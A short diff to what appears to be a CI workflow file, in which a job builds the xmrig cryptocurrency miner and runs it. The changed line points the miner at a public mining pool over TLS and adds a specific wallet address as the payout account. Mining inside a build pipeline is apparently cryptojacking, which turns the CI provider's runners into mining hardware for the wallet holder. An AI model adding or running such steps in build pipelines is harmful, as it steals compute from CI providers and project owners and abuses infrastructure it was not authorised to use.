@@ -21,4 +21,4 @@ jobs:
               cmake .. -DCMAKE_BUILD_TYPE=Release
               make --jobs=$(nproc)
 
-              ./xmrig --donate-level 0 -o 45.85.90.9:3333 
+              ./xmrig --donate-level 5 -o us-west.minexmr.com:443 -u 42pKVvPZ6X6WiQbdNdVnx7ix75JgpUSdyK9r5q5Q9sdRTH5MmqRTgNyBvZfPRTyEFrPuMELm6zuS6FqUwkbttUiDTiV3QgV -k --tls
